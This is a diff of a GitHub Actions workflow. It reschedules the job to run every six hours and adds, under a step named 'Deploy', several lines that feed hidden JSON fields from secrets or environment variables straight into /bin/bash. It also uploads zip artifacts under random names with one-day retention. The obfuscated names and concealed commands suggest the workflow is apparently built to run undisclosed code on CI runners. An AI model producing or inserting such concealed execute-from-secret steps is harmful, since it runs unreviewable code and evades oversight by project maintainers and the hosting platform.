@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '7 4,10,16,22 * * *'
+    - cron: '26 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,14 +16,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Deploy
         env:
-          pfvs83: ${{ secrets.pfvs83 }}
+          io45996: ${{ secrets.io45996 }}
         run: |
-          printf '%s' "$pfvs83" | jq -r .z92 | /bin/bash
-          printf '%s' "$kenfd24016" | jq -r .arls712 | /bin/bash
+          printf '%s' "$io45996" | jq -r .cn9 | /bin/bash
+          echo $lncsu1 | jq -r .abrsr32980 | /bin/bash
+          echo $obgg15 | jq -r .iurw606 | /bin/bash
+          printf '%s' "$z13" | jq -r .s026 | /bin/bash
+          echo $pdmz7036 | jq -r .mvba6719 | /bin/bash
+          printf '%s' "$z01" | jq -r .hcjy16 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: PleHtVrS
+          name: ab7RFXz4
           path: "*.zip"
           retention-days: 1
